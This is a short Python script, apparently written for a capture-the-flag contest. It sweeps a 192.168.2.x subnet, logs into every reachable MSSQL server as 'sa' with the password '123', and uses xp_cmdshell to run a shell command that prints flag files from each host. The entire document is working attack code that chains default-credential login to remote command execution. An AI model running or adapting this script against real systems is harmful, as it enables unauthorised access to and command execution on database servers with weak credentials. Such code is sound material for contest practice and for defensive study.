import pymssql  
for i in range(254):
	try:
		ip='192.168.2.'+str(i)
		conn=pymssql.connect(host=ip,user='sa',password='123',timeout=1,login_timeout=1)
		cur=conn.cursor()
		try:
			sql = "exec master.dbo.xp_cmdshell 'type C:\\flag*.txt'"
			cur.execute(sql)  
			re=cur.fetchall()  
			print i,re
			cur.close()
			conn.close()  
		except:
			print i,'sql down'
	except:
		print i,'connect down'
